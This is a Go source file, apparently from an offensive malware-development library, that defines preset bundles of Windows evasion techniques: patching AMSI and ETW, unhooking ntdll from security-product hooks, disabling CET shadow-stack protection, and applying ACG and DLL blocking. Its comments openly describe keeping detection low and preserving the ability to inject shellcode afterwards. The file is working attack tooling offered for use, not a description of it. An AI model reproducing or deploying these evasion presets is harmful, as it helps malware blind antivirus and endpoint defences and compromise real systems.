//go:build windows

package preset

import (
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/acg"
	"github.com/oioio-space/maldev/evasion/amsi"
	"github.com/oioio-space/maldev/evasion/blockdlls"
	"github.com/oioio-space/maldev/evasion/cet"
	"github.com/oioio-space/maldev/evasion/etw"
	"github.com/oioio-space/maldev/evasion/unhook"
)

// cetDisableTechnique opts the current process out of CET shadow-stack
// enforcement when active. On hosts where CET is not enforced the
// underlying call is a no-op — we squash that error so the preset
// stays composable across builds.
type cetDisableTechnique struct{}

func (cetDisableTechnique) Name() string { return "cet.Disable" }
func (cetDisableTechnique) Apply(_ evasion.Caller) error {
	if !cet.Enforced() {
		return nil
	}
	if err := cet.Disable(); err != nil {
		// ERROR_NOT_SUPPORTED on hosts that recognise the
		// mitigation but refuse to opt out — handled by callers
		// via cet.Wrap on the shellcode side.
		return err
	}
	return nil
}

// CETOptOut returns a Technique that calls cet.Disable on Win11+
// CET-enforced hosts and is a no-op everywhere else. Safe to
// include in any preset.
func CETOptOut() evasion.Technique { return cetDisableTechnique{} }

// Minimal returns AMSI + ETW patches. Least detectable, most compatible.
func Minimal() []evasion.Technique {
	return []evasion.Technique{
		amsi.ScanBufferPatch(),
		etw.All(),
	}
}

// Stealth returns Minimal + selective unhook of commonly hooked NT functions.
func Stealth() []evasion.Technique {
	return append(Minimal(), unhook.CommonClassic()...)
}

// Hardened sits between Stealth and Aggressive: AMSI + ETW + full
// ntdll unhook + CET opt-out. Drops the per-process mitigations
// (ACG, BlockDLLs) that prevent further RWX / non-MS DLL loads, so
// callers can still inject afterwards. Use this on Win11+ CET hosts
// where the smaller Stealth bundle would let APC-delivered shellcode
// trip on ENDBR64.
func Hardened() []evasion.Technique {
	return []evasion.Technique{
		amsi.All(),
		etw.All(),
		unhook.Full(),
		CETOptOut(),
	}
}

// Aggressive returns everything: AMSI, ETW, full ntdll unhook,
// CET opt-out, ACG, block DLLs.
//
// WARNING: ACG prevents subsequent RWX allocation. Apply AFTER
// injection.
func Aggressive() []evasion.Technique {
	return []evasion.Technique{
		amsi.All(),
		etw.All(),
		unhook.Full(),
		CETOptOut(),
		acg.Guard(),
		blockdlls.MicrosoftOnly(),
	}
}
